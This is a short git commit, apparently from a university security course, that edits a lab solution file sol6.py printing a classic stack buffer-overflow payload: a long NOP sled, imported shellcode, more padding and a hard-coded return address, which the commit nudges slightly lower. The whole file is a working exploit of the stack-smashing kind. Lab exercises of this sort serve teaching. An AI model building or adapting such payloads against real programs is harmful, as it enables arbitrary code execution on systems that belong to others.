59b5a3cdcba6c7978ad5a5e2c7ec3727f275d08d
Kari Green <cngreen@umich.edu>
2017-11-08 22:49:53 -0500

    made the target just a little lower just in case

--- targets/sol6.py
+++ targets/sol6.py
@@ -1,4 +1,4 @@
 from shellcode import shellcode
 #print shellcode + 
-print "\x90"*683 + shellcode + "\x90"*300 + "\xf0\xf7\xfe\xbf"
+print "\x90"*683 + shellcode + "\x90"*300 + "\xf0\xf8\xfe\xbf"
 #print "\xAA"*1036 + "\xa0\xf6\xfe\xbf"
